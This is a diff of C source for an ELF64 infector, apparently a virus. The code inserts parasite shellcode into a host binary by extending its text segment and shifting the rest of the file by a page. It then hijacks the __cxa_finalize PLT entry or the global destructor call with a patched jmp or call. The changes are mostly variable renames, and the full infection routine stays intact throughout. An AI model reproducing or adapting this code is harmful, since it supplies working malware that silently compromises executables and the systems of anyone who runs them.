@@ -21,14 +21,18 @@ uint8_t epilogue[EPILOGUE_LEN] = {
   0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
 };
 
-uint8_t jump[5] = {
+uint8_t jmp[5] = {
     0xe9, 0x00, 0x00, 0x00, 0x00, // jmp ?
 };
+
+uint32_t *jmp_operand = (uint32_t *)&jmp[1];
 
 uint8_t call[6] = {
     0xe8, 0x00, 0x00, 0x00, 0x00, // call ?
     0x90                          // nop
 };
+
+uint32_t *call_operand = (uint32_t *)&call[1];
 
 // If file_len contains a non-zero value, the file will be
 // truncated to its current length + value in file_len.
@@ -271,7 +275,7 @@ static int find_cxafin_pltgot(struct parasite_host *host)
 {
     uint64_t i;
     Elf64_Sym sym_it;
-    uint8_t *cxafin_bytes = NULL,
+    uint8_t *cxafin_got = NULL,
             *plt_got = (uint8_t *)((uint64_t)host->elf +
                                              host->plt_got->sh_offset);
     uint32_t saved_offt;
@@ -280,24 +284,24 @@ static int find_cxafin_pltgot(struct parasite_host *host)
         sym_it = host->dyn_sym[ELF64_R_SYM(host->rela_dyn[i].r_info)];
 
         if (!memcmp(&host->dyn_str[sym_it.st_name], "__cxa_finalize", 15)) {
-            cxafin_bytes = (uint8_t *)((uint64_t)host->elf +
+            cxafin_got = (uint8_t *)((uint64_t)host->elf +
                                                  host->rela_dyn[i].r_offset);
             break;
         }
     }
 
-    if (!cxafin_bytes) return -1;
+    if (!cxafin_got) return -1;
 
-    DBG("[DEBUG] __cxa_finalize\t\t@%p\n", cxafin_bytes);
+    DBG("[DEBUG] __cxa_finalize\t\t@%p\n", cxafin_got);
 
     for (i=0; i < host->plt_got->sh_size; i++) {
         if (plt_got[i] == 0xff && plt_got[i+1] == 0x25) {
             saved_offt = *(uint32_t *)&plt_got[i+2];
-            if (cxafin_bytes == (&plt_got[i+6] + saved_offt)) {
+            if (cxafin_got == (&plt_got[i+6] + saved_offt)) {
                 DBG("[DEBUG] code offset:\t\t0x%x\n", saved_offt);
                 memcpy(&epilogue[EPILOGUE_JMPOFFT],
                        &plt_got[i], 6);
-                host->jmp_to_payload = &plt_got[i];
+                host->hijack_site = &plt_got[i];
                 return 0;
             }
         }
@@ -308,9 +312,9 @@ static int find_cxafin_pltgot(struct parasite_host *host)
 static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
 {
     uint64_t i,j;
-    uint64_t bytes_after_text;
+    uint64_t bytes_to_eof;
     Elf64_Addr infect_vaddr = 0;
-    uint8_t *end_of_text;
+    uint8_t *infct_site;
 
     // total length of the parasite
     size_t shellcode_len = parasite->text_size;
@@ -352,15 +356,15 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
 
                 DBG("[DEBUG] Total segment size:\t%lu\n", total_segment_size);
 
-                end_of_text = host->bytes +
+                infct_site = host->bytes +
                               host->phdrs[i].p_offset+host->phdrs[i].p_filesz;
 
                 infect_vaddr = host->phdrs[i].p_vaddr +
                                host->phdrs[i].p_memsz;
 
-                bytes_after_text = (host->size -
-                                    host->phdrs[i].p_offset -
-                                    host->phdrs[i].p_filesz);
+                bytes_to_eof = (host->size -
+                                host->phdrs[i].p_offset -
+                                host->phdrs[i].p_filesz);
 
                 host->phdrs[i].p_filesz += shellcode_len;
                 host->phdrs[i].p_memsz += shellcode_len;
@@ -383,29 +387,29 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
     }
 
     uint32_t *rel_cxa_finalize = (uint32_t *)&epilogue[EPILOGUE_JMPOFFT+2];
-    *rel_cxa_finalize -= (((uint64_t)end_of_text+shellcode_len-inst_len) -
-                          (uint64_t)host->jmp_to_payload);
+    *rel_cxa_finalize -= (((uint64_t)infct_site+shellcode_len-inst_len) -
+                          (uint64_t)host->hijack_site);
 
-    memcpy(host->scratch_space, end_of_text, bytes_after_text);
-    *end_of_text = PUSH_RDI;
-    memcpy(end_of_text+PROLOGUE_LEN, parasite->text_bytes, parasite->text_size);
-    memcpy(end_of_text+PROLOGUE_LEN+parasite->text_size, epilogue, EPILOGUE_LEN);
+    memcpy(host->scratch_space, infct_site, bytes_to_eof);
+    *infct_site = PUSH_RDI;
+    memcpy(infct_site+PROLOGUE_LEN, parasite->text_bytes, parasite->text_size);
+    memcpy(infct_site+PROLOGUE_LEN+parasite->text_size, epilogue, EPILOGUE_LEN);
     if (HIJACK_DTORS(options))
-        *(end_of_text + PROLOGUE_LEN + parasite->text_size + EPILOGUE_LEN) = RET;
-    memcpy(end_of_text+PAGE_SIZE, host->scratch_space, bytes_after_text);
+        *(infct_site + PROLOGUE_LEN + parasite->text_size + EPILOGUE_LEN) = RET;
+    memcpy(infct_site+PAGE_SIZE, host->scratch_space, bytes_to_eof);
     host->elf->e_shoff += PAGE_SIZE;
 
-    uint32_t offt = (uint32_t) ((uint64_t)end_of_text -
-                               ((uint64_t)host->jmp_to_payload+5));
+    uint32_t virus_offt = (uint32_t) ((uint64_t)infct_site -
+                                     ((uint64_t)host->hijack_site+5));
 
-    DBG("[DEBUG] jmp_to_payload:\t\t%p\n", host->jmp_to_payload);
+    DBG("[DEBUG] hijack_site:\t\t%p\n", host->hijack_site);
 
     if (HIJACK_PLT(options)) {
-        *(uint32_t *)&jump[1] = offt;
-        memcpy(host->jmp_to_payload, jump, 5);
+        *jmp_operand = virus_offt;
+        memcpy(host->hijack_site, jmp, 5);
     } else if (HIJACK_DTORS(options)) {
-        *(uint32_t *)&call[1] = offt;
-        memcpy(host->jmp_to_payload, call, 6);
+        *call_operand = virus_offt;
+        memcpy(host->hijack_site, call, 6);
     }
 
     return 0;
@@ -415,7 +419,7 @@ static int find_cxafin_dtors(struct parasite_host *host)
 {
     uint64_t i;
     uint32_t saved_offt;
-    uint8_t *cxafin_bytes = NULL;
+    uint8_t *cxafin_got = NULL;
 
 
     /* this is a shitty but safer way to scan: a stray c3 in code will
@@ -426,17 +430,17 @@ static int find_cxafin_dtors(struct parasite_host *host)
     for (i=0; host->do_glob_dtors[i+8] != RET; i++) {
         if (!memcmp(&host->do_glob_dtors[i], qwordcmp, 3)) {
             saved_offt = *(uint32_t *)&host->do_glob_dtors[i+3];
-            cxafin_bytes = &host->do_glob_dtors[i+8] + saved_offt;
-            DBG("[DEBUG][CMP] __cxa_finalize\t@%p\n", cxafin_bytes);
+            cxafin_got = &host->do_glob_dtors[i+8] + saved_offt;
+            DBG("[DEBUG][CMP] __cxa_finalize\t@%p\n", cxafin_got);
         }
 
         if (!memcmp(&host->do_glob_dtors[i], qwordcall, 2)) {
             saved_offt = *(uint32_t *)&host->do_glob_dtors[i+2];
-            if (cxafin_bytes == &host->do_glob_dtors[i+6] + saved_offt) {
-                DBG("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_bytes);
+            if (cxafin_got == &host->do_glob_dtors[i+6] + saved_offt) {
+                DBG("[DEBUG] Found __cxa_finalize\t@%p\n", cxafin_got);
                 memcpy(&epilogue[EPILOGUE_JMPOFFT],
                        &host->do_glob_dtors[i], 6);
-                host->jmp_to_payload = &host->do_glob_dtors[i];
+                host->hijack_site = &host->do_glob_dtors[i];
                 return 0;
             }
         }
